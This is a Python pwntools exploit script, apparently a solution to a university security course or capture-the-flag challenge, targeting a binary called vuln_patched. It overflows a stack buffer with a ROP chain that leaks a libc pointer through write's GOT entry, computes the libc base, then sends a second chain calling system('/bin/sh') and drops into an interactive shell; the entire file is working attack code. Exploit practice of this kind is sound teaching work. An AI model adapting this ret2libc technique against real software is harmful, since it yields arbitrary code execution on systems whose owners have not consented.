#!/usr/bin/env python3

import pwn

# pwninit
exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

port = 1024
#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
conn = pwn.process([exe.path])


# we write a first ropchain to leak a libc pointer
# 

# write want: 0x1 in edi and a pointer to a buffer in rsi
# we use .got of vuln as pointer, so it dereferences it and writes the pointer of write aka a libc pointer
#objdump -M intel -d ./vuln
address_call_write = 0x40106d
gadget_pop_rdi = 0x0000000000401069
gadget_pop_rsi = 0x000000000040106b
got_vuln_write = 0x403FE0

rop_chain = [
    pwn.p64(gadget_pop_rdi),
    pwn.p64(1),
    pwn.p64(gadget_pop_rsi),
    pwn.p64(got_vuln_write),
    pwn.p64(address_call_write)
]

rop_chain = b'A'*0x28 +  b''.join(gadget for gadget in rop_chain)

print(rop_chain.hex())
conn.sendlineafter(b"Hello, what's your name?\n", rop_chain)

# recv 8 bytes aka a pointer
pointer = conn.recv(numb=8)
libc_write_pointer = pwn.u64(pointer)
print(hex(libc_write_pointer))


libc_base = libc_write_pointer - libc.symbols['write']
libc.address = libc_base
print(hex(libc_base))

# write second ropchain, this time call system :)
rop = pwn.ROP(libc)
rop.call(rop.ret) # this is needed for aligned sothat syscall is 16 byte aligned
# call system, so jump to this address and set parameter beforehand
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

payload = b'A'*(0x28) + rop.chain()
conn.sendline(payload)

conn.interactive()
